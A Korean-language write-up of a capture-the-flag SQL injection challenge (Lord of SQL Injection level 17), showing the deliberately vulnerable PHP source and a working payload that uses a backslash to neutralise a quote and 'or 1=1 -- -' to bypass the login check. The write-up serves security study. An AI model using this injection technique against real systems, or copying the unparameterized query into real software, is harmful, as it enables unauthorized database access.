# Lord of SQL Injection No.17 - succubus
## 문제 출제 의도
\ (backSlach)을 통해 single quote를 무효화 시킬 수 있는지 확인한다.
## 소스 코드 분석
+ 소스 코드  
succubus 의 소스 코드는 다음과 같다.
    ~~~
    <?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(preg_match('/\'/i', $_GET[id])) exit("HeHe"); 
    if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
    $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) solve("succubus"); 
    highlight_file(__FILE__); 
    ?>
    ~~~
+ 소스 코드 분석
    - preg_match
        * GET방식으로 받은 id안에 prob, _, .,(,)이 하나라도 있으면 "No Hack ~_~"이 출력되고 문제 풀이에 실패한다.
        * GET방식으로 받은 pw안에 prob, _, .,(,)이 하나라도 있으면 "No Hack ~_~"이 출력되고 문제 풀이에 실패한다.
        * GET방식으로 받은 id안에 single quote가 있으면 "HeHe"가 출력되고 문제 풀이에 실패한다.
        * GET방식으로 받은 pw안에 single quote가 있으면 "HeHe"가 출력되고 문제 풀이에 실패한다.

## 문제 해결
+ \ back_Slash
    ~~~
    ?id=\&pw=or 1=1 -- -
    ~~~
    위 같은 문자열을 URL뒤에 추가하면하면 id앞의 '부터 pw의 앞의 single quote까지 묶이게 된다.  
    따라서 WHRER을 무시하기 위해 or 1=1 -- - 을 삽입하여 문제를 해결한다.